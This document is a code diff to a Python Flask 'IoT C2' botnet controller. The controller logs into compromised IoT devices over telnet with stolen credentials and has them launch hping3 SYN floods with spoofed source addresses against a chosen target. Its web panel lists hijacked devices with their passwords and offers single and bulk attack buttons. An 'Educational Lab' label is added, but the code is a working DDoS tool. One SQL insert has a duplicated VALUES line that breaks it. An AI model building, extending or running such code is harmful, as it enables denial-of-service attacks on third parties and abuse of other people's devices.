@@ -162,11 +162,17 @@ class DatabaseManager:
 
             # Handle login prompt
             login_patterns = [b"login: ", b"Username: ", b"Login: "]
-            index, match, response = tn.expect(login_patterns, timeout=15)
-            logging.info(f"Login response from {ip}: {response.decode(errors='ignore')}")
-            
-            if not match:
-                logging.error(f"No login prompt detected on {ip}")
+            try:
+                index, match, response = tn.expect(login_patterns, timeout=15)
+                response_text = response.decode(errors='ignore')
+                logging.info(f"Login response from {ip}: {response_text}")
+                
+                if not match:
+                    logging.error(f"✗ No login prompt detected on {ip}")
+                    tn.close()
+                    return None
+            except Exception as e:
+                logging.error(f"✗ Timeout or error waiting for login prompt on {ip}: {e}")
                 tn.close()
                 return None
 
@@ -176,11 +182,17 @@ class DatabaseManager:
 
             # Handle password prompt
             password_patterns = [b"Password: ", b"password: ", b"Password:", b"password:"]
-            index, match, response = tn.expect(password_patterns, timeout=10)
-            logging.info(f"Password prompt response from {ip}: {response.decode(errors='ignore')}")
-            
-            if not match:
-                logging.error(f"No password prompt detected on {ip}")
+            try:
+                index, match, response = tn.expect(password_patterns, timeout=10)
+                response_text = response.decode(errors='ignore')
+                logging.info(f"Password prompt response from {ip}: {response_text}")
+                
+                if not match:
+                    logging.error(f"✗ No password prompt detected on {ip}")
+                    tn.close()
+                    return None
+            except Exception as e:
+                logging.error(f"✗ Timeout or error waiting for password prompt on {ip}: {e}")
                 tn.close()
                 return None
 
@@ -190,21 +202,33 @@ class DatabaseManager:
 
             # Wait for shell prompt after login
             shell_patterns = [b"$ ", b"# ", b"> ", b"$", b"#", b">"]
-            index, match, response = tn.expect(shell_patterns, timeout=15)
-            logging.info(f"Shell prompt response from {ip}: {response.decode(errors='ignore')}")
-            
-            if not match:
-                logging.error(f"No shell prompt detected on {ip} after login")
+            try:
+                index, match, response = tn.expect(shell_patterns, timeout=15)
+                response_text = response.decode(errors='ignore')
+                logging.info(f"Shell prompt response from {ip}: {response_text}")
+                
+                # Check for login failure messages
+                if any(msg in response_text.lower() for msg in ['login incorrect', 'access denied', 'authentication failed']):
+                    logging.error(f"✗ Login failed for {ip} - authentication rejected")
+                    tn.close()
+                    return None
+                    
+                if not match:
+                    logging.error(f"✗ No shell prompt detected on {ip} after login")
+                    tn.close()
+                    return None
+            except Exception as e:
+                logging.error(f"✗ Timeout or error waiting for shell prompt on {ip}: {e}")
                 tn.close()
                 return None
 
-            logging.info(f"Successfully logged into {ip}, sending command: {command}")
+            logging.info(f"✓ Successfully logged into {ip}, sending command: {command}")
             
             # Send the sudo hping3 command
             tn.write(command.encode() + b"\n")
             time.sleep(2)
 
-            # Check for sudo password prompt specifically
+            # Check for sudo password prompt and hping3 execution
             sudo_patterns = [
                 b"[sudo] password for",
                 b"Password:",
@@ -212,7 +236,6 @@ class DatabaseManager:
                 b"Enter password:"
             ]
             
-            # Also check for hping3 startup messages
             hping_patterns = [
                 b"HPING",
                 b"hping",
@@ -220,141 +243,88 @@ class DatabaseManager:
                 b"flood mode"
             ]
             
-            # And error patterns
             error_patterns = [
                 b"command not found",
                 b"Permission denied",
                 b"sudo: command not found",
-                b"hping3: command not found"
+                b"hping3: command not found",
+                b"No such file or directory"
             ]
             
-            # Combine all patterns for initial response
             all_patterns = sudo_patterns + hping_patterns + error_patterns + shell_patterns
             
-            index, match, response = tn.expect(all_patterns, timeout=20)
-            response_text = response.decode(errors='ignore')
-            logging.info(f"Command response from {ip}: {response_text}")
+            try:
+                index, match, response = tn.expect(all_patterns, timeout=20)
+                response_text = response.decode(errors='ignore')
+                logging.info(f"Command response from {ip}: {response_text}")
 
-            if match:
-                matched_pattern = match.group(0)
-                
-                # Check if it's a sudo password prompt
-                if any(pattern in matched_pattern for pattern in sudo_patterns):
-                    logging.info(f"Sudo password prompt detected on {ip}, sending password")
-                    tn.write(password.encode() + b"\n")
-                    time.sleep(3)
+                if match:
+                    matched_pattern = match.group(0)
                     
-                    # After sending sudo password, check for hping3 execution
-                    post_sudo_patterns = hping_patterns + error_patterns + shell_patterns
-                    index2, match2, response2 = tn.expect(post_sudo_patterns, timeout=15)
-                    response2_text = response2.decode(errors='ignore')
-                    logging.info(f"Post-sudo response from {ip}: {response2_text}")
-                    
-                    if match2:
-                        matched_pattern2 = match2.group(0)
-                        
-                        # Check if hping3 started successfully
-                        if any(pattern in matched_pattern2 for pattern in hping_patterns):
-                            logging.info(f"✓ Hping3 successfully started on {ip}")
-                            
-                            # Verify it's actually running by checking process
-                            time.sleep(2)
-                            self.verify_hping3_running(tn, ip)
-                            return tn
-                        
-                        # Check for errors
-                        elif any(pattern in matched_pattern2 for pattern in error_patterns):
-                            logging.error(f"✗ Hping3 failed to start on {ip}: {response2_text}")
-                            tn.close()
-                            return None
-                        
-                        else:
-                            logging.warning(f"? Unknown response after sudo on {ip}: {response2_text}")
-                            # Still try to verify if hping3 is running
-                            self.verify_hping3_running(tn, ip)
-                            return tn
-                    
-                    else:
-                        logging.error(f"✗ No response after sudo password on {ip}")
+                    # Check for errors first
+                    if any(pattern in matched_pattern for pattern in error_patterns):
+                        logging.error(f"✗ Command failed on {ip}: {response_text}")
                         tn.close()
                         return None
-                
-                # Check if hping3 started directly (no sudo needed)
-                elif any(pattern in matched_pattern for pattern in hping_patterns):
-                    logging.info(f"✓ Hping3 started directly on {ip} (no sudo required)")
-                    time.sleep(2)
-                    self.verify_hping3_running(tn, ip)
+                    
+                    # Check if it's a sudo password prompt
+                    elif any(pattern in matched_pattern for pattern in sudo_patterns):
+                        logging.info(f"Sudo password prompt detected on {ip}, sending password")
+                        tn.write(password.encode() + b"\n")
+                        time.sleep(3)
+                        
+                        # After sending sudo password, check for hping3 execution
+                        post_sudo_patterns = hping_patterns + error_patterns + shell_patterns
+                        try:
+                            index2, match2, response2 = tn.expect(post_sudo_patterns, timeout=15)
+                            response2_text = response2.decode(errors='ignore')
+                            logging.info(f"Post-sudo response from {ip}: {response2_text}")
+                            
+                            if match2:
+                                matched_pattern2 = match2.group(0)
+                                
+                                if any(pattern in matched_pattern2 for pattern in error_patterns):
+                                    logging.error(f"✗ Hping3 command failed on {ip}: {response2_text}")
+                                    tn.close()
+                                    return None
+                                elif any(pattern in matched_pattern2 for pattern in hping_patterns):
+                                    logging.info(f"✓ Hping3 successfully started on {ip}")
+                                    time.sleep(2)
+                                    return tn
+                                else:
+                                    logging.warning(f"? Unknown response after sudo on {ip}: {response2_text}")
+                                    return tn
+                        except Exception as e:
+                            logging.error(f"✗ Error after sudo password on {ip}: {e}")
+                            tn.close()
+                            return None
+                    
+                    # Check if hping3 started directly
+                    elif any(pattern in matched_pattern for pattern in hping_patterns):
+                        logging.info(f"✓ Hping3 started directly on {ip} (no sudo required)")
+                        time.sleep(2)
+                        return tn
+                    
+                    else:
+                        logging.warning(f"? Shell prompt returned immediately on {ip}")
+                        return tn
+                else:
+                    logging.warning(f"? No expected pattern matched on {ip}")
                     return tn
-                
-                # Check for immediate errors
-                elif any(pattern in matched_pattern for pattern in error_patterns):
-                    logging.error(f"✗ Command failed on {ip}: {response_text}")
-                    tn.close()
-                    return None
-                
-                # Shell prompt returned - command may have failed silently
-                elif any(pattern in matched_pattern for pattern in shell_patterns):
-                    logging.warning(f"? Shell prompt returned immediately on {ip} - checking if hping3 is running")
-                    self.verify_hping3_running(tn, ip)
-                    return tn
-            
-            else:
-                logging.warning(f"? No expected pattern matched on {ip} - checking if hping3 is running")
-                self.verify_hping3_running(tn, ip)
-                return tn
+                    
+            except Exception as e:
+                logging.error(f"✗ Error executing command on {ip}: {e}")
+                tn.close()
+                return None
 
         except Exception as e:
-            logging.error(f"Telnet execution failed for {ip}: {e}")
+            logging.error(f"✗ Telnet execution failed for {ip}: {e}")
             if tn:
                 try:
                     tn.close()
                 except:
                     pass
             return None
-
-    def verify_hping3_running(self, tn, ip):
-        """Verify if hping3 process is actually running on the device"""
-        try:
-            logging.info(f"Verifying hping3 is running on {ip}")
-            
-            # Send Ctrl+C first to get to a shell prompt
-            tn.write(b"\x03")
-            time.sleep(1)
-            
-            # Clear any output
-            tn.read_very_eager()
-            
-            # Check running processes for hping3
-            tn.write(b"ps aux | grep hping3 | grep -v grep\n")
-            time.sleep(2)
-            
-            # Read the response
-            response = tn.read_very_eager()
-            response_text = response.decode(errors='ignore')
-            logging.info(f"Process check response from {ip}: {response_text}")
-            
-            if "hping3" in response_text and "--flood" in response_text:
-                logging.info(f"✓ Confirmed: hping3 is running on {ip}")
-                return True
-            else:
-                logging.warning(f"✗ hping3 not found in process list on {ip}")
-                
-                # Try alternative check with pgrep
-                tn.write(b"pgrep -f hping3\n")
-                time.sleep(2)
-                response2 = tn.read_very_eager()
-                response2_text = response2.decode(errors='ignore')
-                
-                if response2_text.strip() and response2_text.strip().isdigit():
-                    logging.info(f"✓ Confirmed: hping3 PID {response2_text.strip()} found on {ip}")
-                    return True
-                else:
-                    logging.error(f"✗ hping3 is NOT running on {ip}")
-                    return False
-                    
-        except Exception as e:
-            logging.error(f"Error verifying hping3 on {ip}: {e}")
-            return False
 
 # Global variables
 db_manager = DatabaseManager()
@@ -376,120 +346,293 @@ HTML_TEMPLATE = '''
 <!DOCTYPE html>
 <html>
 <head>
-    <title>IoT C2 Server</title>
+    <title>IoT C2 Research Panel</title>
     <style>
-        body { font-family: Arial, sans-serif; margin: 20px; }
-        .container { max-width: 1200px; margin: 0 auto; }
-        .section { margin-bottom: 20px; padding: 20px; border: 1px solid #ddd; }
-        table { width: 100%; border-collapse: collapse; }
-        th, td { padding: 8px; text-align: left; border: 1px solid #ddd; }
-        th { background-color: #f5f5f5; }
-        .button { padding: 5px 10px; margin: 2px; cursor: pointer; }
-        .success { color: green; }
-        .error { color: red; }
+        body { 
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
+            margin: 0; 
+            padding: 20px; 
+            background-color: #f5f5f5; 
+        }
+        .container { 
+            max-width: 1400px; 
+            margin: 0 auto; 
+            background: white; 
+            border-radius: 8px; 
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1); 
+            overflow: hidden;
+        }
+        .header { 
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); 
+            color: white; 
+            padding: 20px; 
+            text-align: center; 
+        }
+        .header h1 { margin: 0; font-size: 24px; }
+        .stats { 
+            display: flex; 
+            background: #f8f9fa; 
+            border-bottom: 1px solid #dee2e6; 
+        }
+        .stat-box { 
+            flex: 1; 
+            padding: 15px; 
+            text-align: center; 
+            border-right: 1px solid #dee2e6; 
+        }
+        .stat-box:last-child { border-right: none; }
+        .stat-number { font-size: 24px; font-weight: bold; color: #495057; }
+        .stat-label { font-size: 12px; color: #6c757d; text-transform: uppercase; }
+        .section { 
+            margin: 20px; 
+            background: white; 
+            border-radius: 6px; 
+            overflow: hidden; 
+            border: 1px solid #dee2e6;
+        }
+        .section-header { 
+            background: #f8f9fa; 
+            padding: 12px 16px; 
+            border-bottom: 1px solid #dee2e6; 
+            font-weight: 600; 
+            font-size: 16px; 
+        }
+        table { 
+            width: 100%; 
+            border-collapse: collapse; 
+        }
+        th, td { 
+            padding: 12px 16px; 
+            text-align: left; 
+            border-bottom: 1px solid #f1f3f4; 
+        }
+        th { 
+            background-color: #f8f9fa; 
+            font-weight: 600; 
+            font-size: 14px; 
+            color: #495057; 
+        }
+        td { font-size: 14px; }
+        .status-online { 
+            background: #d4edda; 
+            color: #155724; 
+            padding: 4px 8px; 
+            border-radius: 12px; 
+            font-size: 12px; 
+            font-weight: 500; 
+        }
+        .btn { 
+            padding: 6px 12px; 
+            margin: 2px; 
+            border: none; 
+            border-radius: 4px; 
+            cursor: pointer; 
+            font-size: 12px; 
+            font-weight: 500; 
+            transition: all 0.2s; 
+        }
+        .btn-attack { background: #dc3545; color: white; }
+        .btn-attack:hover { background: #c82333; }
+        .btn-stop { background: #6c757d; color: white; }
+        .btn-stop:hover { background: #5a6268; }
+        .btn-bulk { 
+            background: #007bff; 
+            color: white; 
+            padding: 10px 20px; 
+            margin: 10px; 
+            font-size: 14px; 
+        }
+        .btn-bulk:hover { background: #0056b3; }
+        .ip-address { font-family: 'Courier New', monospace; color: #495057; }
+        .credentials { font-family: 'Courier New', monospace; font-size: 12px; color: #6c757d; }
+        .empty-state { 
+            text-align: center; 
+            padding: 40px; 
+            color: #6c757d; 
+        }
+        .bulk-actions { 
+            background: #f8f9fa; 
+            padding: 15px; 
+            border-bottom: 1px solid #dee2e6; 
+            text-align: center; 
+        }
+        tr:hover { background-color: #f8f9fa; }
     </style>
 </head>
 <body>
     <div class="container">
-        <h1>IoT C2 Server Control Panel</h1>
-        
-        <div class="section">
-            <h2>Active Bots</h2>
-            <table>
-                <tr>
-                    <th>IP Address</th>
-                    <th>Username</th>
-                    <th>Password</th>
-                    <th>Status</th>
-                    <th>Last Seen</th>
-                    <th>Actions</th>
-                </tr>
-                {% for bot in bots %}
-                <tr>
-                    <td>{{ bot.ip }}</td>
-                    <td>{{ bot.username }}</td>
-                    <td>{{ bot.password }}</td>
-                    <td>{{ bot.status }}</td>
-                    <td>{{ bot.last_seen }}</td>
-                    <td>
-                        <button onclick="startAttack('{{ bot.ip }}')">Start Attack</button>
-                        <button onclick="stopAttack('{{ bot.ip }}')">Stop Attack</button>
-                    </td>
-                </tr>
-                {% endfor %}
-            </table>
+        <div class="header">
+            <h1>IoT Security Research - C2 Panel</h1>
+            <p style="margin: 5px 0 0 0; opacity: 0.9;">Educational Lab Environment</p>
+        </div>
+
+        <div class="stats">
+            <div class="stat-box">
+                <div class="stat-number">{{ bots|length }}</div>
+                <div class="stat-label">Compromised Devices</div>
+            </div>
+            <div class="stat-box">
+                <div class="stat-number">{{ scan_results|length }}</div>
+                <div class="stat-label">Discovered Targets</div>
+            </div>
+            <div class="stat-box">
+                <div class="stat-number">{{ active_sessions }}</div>
+                <div class="stat-label">Active Sessions</div>
+            </div>
         </div>
 
         <div class="section">
-            <h2>Scan Results</h2>
+            <div class="section-header">Compromised Devices</div>
+            {% if bots %}
+            <div class="bulk-actions">
+                <button class="btn btn-bulk" onclick="startBulkAttack()">Start Bulk Attack</button>
+                <button class="btn btn-bulk btn-stop" onclick="stopAllAttacks()">Stop All Attacks</button>
+            </div>
             <table>
-                <tr>
-                    <th>IP Address</th>
-                    <th>Port</th>
-                    <th>Service</th>
-                    <th>Credentials</th>
-                    <th>Timestamp</th>
-                </tr>
-                {% for result in scan_results %}
-                <tr>
-                    <td>{{ result.ip }}</td>
-                    <td>{{ result.port }}</td>
-                    <td>{{ result.service }}</td>
-                    <td>{{ result.credentials }}</td>
-                    <td>{{ result.timestamp }}</td>
-                </tr>
-                {% endfor %}
+                <thead>
+                    <tr>
+                        <th>IP Address</th>
+                        <th>Credentials</th>
+                        <th>Status</th>
+                        <th>Last Seen</th>
+                        <th>Actions</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    {% for bot in bots %}
+                    <tr>
+                        <td class="ip-address">{{ bot.ip }}</td>
+                        <td class="credentials">{{ bot.username }}:{{ bot.password }}</td>
+                        <td><span class="status-online">{{ bot.status }}</span></td>
+                        <td>{{ bot.last_seen }}</td>
+                        <td>
+                            <button class="btn btn-attack" onclick="startAttack('{{ bot.ip }}')">Attack</button>
+                            <button class="btn btn-stop" onclick="stopAttack('{{ bot.ip }}')">Stop</button>
+                        </td>
+                    </tr>
+                    {% endfor %}
+                </tbody>
             </table>
+            {% else %}
+            <div class="empty-state">
+                <p>No compromised devices available</p>
+                <p style="font-size: 12px;">Run the exploit script to discover and compromise devices</p>
+            </div>
+            {% endif %}
         </div>
 
+        {% if scan_results %}
         <div class="section">
-            <h2>Command History</h2>
+            <div class="section-header">Discovered Targets</div>
             <table>
-                <tr>
-                    <th>Bot IP</th>
-                    <th>Command</th>
-                    <th>Target</th>
-                    <th>Status</th>
-                    <th>Timestamp</th>
-                </tr>
-                {% for cmd in commands %}
-                <tr>
-                    <td>{{ cmd.bot_ip }}</td>
-                    <td>{{ cmd.command }}</td>
-                    <td>{{ cmd.target }}</td>
-                    <td>{{ cmd.status }}</td>
-                    <td>{{ cmd.timestamp }}</td>
-                </tr>
-                {% endfor %}
+                <thead>
+                    <tr>
+                        <th>IP Address</th>
+                        <th>Port</th>
+                        <th>Service</th>
+                        <th>Discovered</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    {% for result in scan_results %}
+                    <tr>
+                        <td class="ip-address">{{ result.ip }}</td>
+                        <td>{{ result.port }}</td>
+                        <td>{{ result.service }}</td>
+                        <td>{{ result.timestamp }}</td>
+                    </tr>
+                    {% endfor %}
+                </tbody>
             </table>
         </div>
+        {% endif %}
     </div>
 
     <script>
         function startAttack(botIp) {
-            const target = prompt('Enter target IP:');
-            const attackType = prompt('Enter attack type (syn/rtsp/mqtt):');
-            if (target && attackType) {
-                fetch('/start-attack', {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({
-                        bot_ip: botIp,
-                        target: target,
-                        attack_type: attackType
-                    })
-                }).then(response => response.json())
-                  .then(data => alert(data.message));
+            const target = prompt('Enter target IP address:');
+            if (!target) return;
+            
+            const attackType = prompt('Attack type:\nsyn - HTTP flood (port 80)\nrtsp - RTSP flood (port 554)\nmqtt - MQTT flood (port 1883)\n\nEnter type:');
+            if (!attackType || !['syn', 'rtsp', 'mqtt'].includes(attackType.toLowerCase())) {
+                alert('Invalid attack type. Use: syn, rtsp, or mqtt');
+                return;
             }
+            
+            fetch('/start-attack', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({
+                    bot_ip: botIp,
+                    target: target,
+                    attack_type: attackType.toLowerCase()
+                })
+            }).then(response => response.json())
+              .then(data => {
+                  if (data.status === 'success') {
+                      alert('✓ Attack started successfully');
+                  } else {
+                      alert('✗ Failed to start attack: ' + data.error);
+                  }
+              })
+              .catch(err => alert('Error: ' + err));
         }
 
         function stopAttack(botIp) {
+            if (!confirm('Stop attack on ' + botIp + '?')) return;
+            
             fetch('/stop-attack', {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
                 body: JSON.stringify({bot_ip: botIp})
             }).then(response => response.json())
-              .then(data => alert(data.message));
+              .then(data => alert(data.message))
+              .catch(err => alert('Error: ' + err));
+        }
+
+        function startBulkAttack() {
+            const target = prompt('Enter target IP for bulk attack:');
+            if (!target) return;
+            
+            const attackType = prompt('Attack type (syn/rtsp/mqtt):');
+            if (!attackType || !['syn', 'rtsp', 'mqtt'].includes(attackType.toLowerCase())) {
+                alert('Invalid attack type');
+                return;
+            }
+            
+            if (!confirm(`Start ${attackType.toUpperCase()} attack on ALL devices against ${target}?`)) return;
+            
+            fetch('/start-telnet-ddos', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({
+                    target: target,
+                    attack_type: attackType.toLowerCase()
+                })
+            }).then(response => response.json())
+              .then(data => {
+                  if (data.status === 'success') {
+                      alert(`✓ ${data.message}`);
+                      setTimeout(() => location.reload(), 2000);
+                  } else {
+                      alert(`✗ ${data.message}`);
+                  }
+              })
+              .catch(err => alert('Error: ' + err));
+        }
+
+        function stopAllAttacks() {
+            if (!confirm('Stop all active attacks?')) return;
+            
+            fetch('/stop-telnet-ddos', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'}
+            }).then(response => response.json())
+              .then(data => {
+                  alert(data.message);
+                  setTimeout(() => location.reload(), 1000);
+              })
+              .catch(err => alert('Error: ' + err));
         }
 
         // Auto-refresh every 30 seconds
@@ -530,6 +673,8 @@ class C2Server:
 @app.route('/')
 def index():
     """Web interface for C2 server"""
+    global active_telnet_sessions
+    
     conn = sqlite3.connect('research_db.sqlite')
     cursor = conn.cursor()
     
@@ -539,25 +684,24 @@ def index():
     
     # Get only the latest scan result for each unique IP
     cursor.execute('''
-        SELECT ip, port, service, credentials, MAX(timestamp) as timestamp
+        SELECT ip, port, service, MAX(timestamp) as timestamp
         FROM attack_logs
+        WHERE port IS NOT NULL
         GROUP BY ip
         ORDER BY timestamp DESC
+        LIMIT 10
     ''')
-    scan_results = [{'ip': row[0], 'port': row[1], 'service': row[2], 
-                    'credentials': row[3], 'timestamp': row[4]} for row in cursor.fetchall()]
-    
-    # Get command history
-    cursor.execute('SELECT id, command, target_ip, attack_type, status, timestamp FROM commands ORDER BY timestamp DESC')
-    commands = [{'id': row[0], 'command': row[1], 'target': row[2], 
-                'attack_type': row[3], 'status': row[4], 'timestamp': row[5]} for row in cursor.fetchall()]
+    scan_results = [{'ip': row[0], 'port': row[1], 'service': row[2], 'timestamp': row[3]} for row in cursor.fetchall()]
     
     conn.close()
+    
+    # Count active telnet sessions
+    active_sessions_count = len(active_telnet_sessions)
     
     return render_template_string(HTML_TEMPLATE, 
                                 bots=bots, 
                                 scan_results=scan_results, 
-                                commands=commands)
+                                active_sessions=active_sessions_count)
 
 @app.route('/bot-checkin', methods=['POST'])
 def bot_checkin():
@@ -707,6 +851,7 @@ def start_attack():
                 cursor.execute('''
                     INSERT INTO commands (command, target_ip, attack_type, status)
                     VALUES (?, ?, ?, 'pending')
+                    VALUES (?, ?, ?, 'pending')
                 ''', (json.dumps(command), target, attack_type))
             
             command_id = cursor.lastrowid
@@ -819,75 +964,84 @@ def start_telnet_ddos():
     global active_telnet_sessions
     try:
         data = request.get_json()
-        logging.info(f"Received data for start-telnet-ddos: {data}")
         target_ip = data.get('target')
-        logging.info(f"start-telnet-ddos: Retrieved target_ip: '{target_ip}', type: {type(target_ip)}")
         attack_type = data.get('attack_type', 'syn')
 
-        # Check if target_ip is None or an empty string explicitly
-        if target_ip is None or target_ip == '':
-            logging.warning("Start-telnet-ddos: Target IP required but not received (explicit check).")
-            return jsonify({'error': 'Target IP missing or empty in request'}), 400
-
-        logging.info("start-telnet-ddos: Target IP check passed.") # Log if the check is passed
+        if not target_ip:
+            logging.error("Target IP missing in request")
+            return jsonify({'error': 'Target IP required'}), 400
 
         # Get all compromised devices from the database
         conn = db_manager.get_connection()
         cursor = conn.cursor()
-        cursor.execute('SELECT ip, username, password FROM devices WHERE status = "online" OR status = "active"')
+        cursor.execute('SELECT ip, username, password FROM devices WHERE status = "online"')
         devices = cursor.fetchall()
         conn.close()
 
-        logging.info(f"Retrieved {len(devices)} devices from database for Telnet DDoS.") # Added logging
+        if not devices:
+            logging.error("No online devices found in database")
+            return jsonify({
+                'status': 'error',
+                'message': 'No online devices available for attack',
+                'successful_ips': []
+            }), 400
 
+        logging.info(f"Retrieved {len(devices)} devices from database for Telnet DDoS.")
         successful_sessions = []
+        failed_sessions = []
 
-        # Translate attack type to hping3 command template
+        # Build hping3 command
         if attack_type == 'syn':
-            hping3_cmd_template = f"sudo hping3 -S -p 80 --flood --rand-source {target_ip}"
+            hping3_cmd = f"sudo hping3 -S -p 80 --flood --rand-source {target_ip}"
         elif attack_type == 'rtsp':
-             hping3_cmd_template = f"sudo hping3 -S -p 554 --flood --rand-source {target_ip}"
+            hping3_cmd = f"sudo hping3 -S -p 554 --flood --rand-source {target_ip}"
         elif attack_type == 'mqtt':
-             hping3_cmd_template = f"sudo hping3 -S -p 1883 --flood --rand-source {target_ip}"
+            hping3_cmd = f"sudo hping3 -S -p 1883 --flood --rand-source {target_ip}"
         else:
             return jsonify({'error': 'Invalid attack type'}), 400
 
-        # Clear any previous active sessions before starting new ones
+        # Clear previous sessions
         active_telnet_sessions.clear()
         logging.info("Cleared previous active Telnet sessions.")
 
         for device in devices:
             ip, username, password = device
-            # Construct the full hping3 command for this device
-            hping3_cmd = hping3_cmd_template
-
-            # Attempt to establish session, login, and send the command
+            logging.info(f"Attempting attack on {ip} with credentials {username}:{password}")
+            
             tn = db_manager.execute_telnet_login_and_send(ip, username, password, hping3_cmd)
 
             if tn:
-                # Store the active Telnet session if successfully established and command sent
                 active_telnet_sessions[ip] = tn
                 successful_sessions.append(ip)
-                logging.info(f"Successfully started Telnet session for {ip} and sent command.")
+                logging.info(f"✓ Successfully started attack on {ip}")
             else:
-                logging.error(f"Failed to establish Telnet session or send command for {ip}.")
+                failed_sessions.append(ip)
+                logging.error(f"✗ Failed to start attack on {ip}")
 
-        return jsonify({
-            'status': 'success',
-            'message': f'Attempted to start {attack_type.upper()} attack sessions on {len(successful_sessions)}/{len(devices)} devices against {target_ip}',
-            'successful_ips': successful_sessions
-        })
+        if successful_sessions:
+            return jsonify({
+                'status': 'success',
+                'message': f'Successfully started {attack_type.upper()} attack on {len(successful_sessions)}/{len(devices)} devices against {target_ip}',
+                'successful_ips': successful_sessions,
+                'failed_ips': failed_sessions
+            })
+        else:
+            return jsonify({
+                'status': 'error',
+                'message': f'Failed to start attack on any devices (0/{len(devices)})',
+                'successful_ips': [],
+                'failed_ips': failed_sessions
+            }), 500
 
     except Exception as e:
-        logging.error(f"Failed to initiate Telnet DDoS attack sessions: {e}")
-        # Attempt to close any sessions that might have been partially opened on error
+        logging.error(f"Failed to initiate Telnet DDoS attack: {e}")
+        # Clean up any partial sessions
         for ip, tn in list(active_telnet_sessions.items()):
-             if tn:
-                  try:
-                       tn.close()
-                       del active_telnet_sessions[ip]
-                  except:
-                       pass
+            try:
+                tn.close()
+                del active_telnet_sessions[ip]
+            except:
+                pass
         return jsonify({'error': str(e)}), 500
 
 @app.route('/stop-telnet-ddos', methods=['POST'])
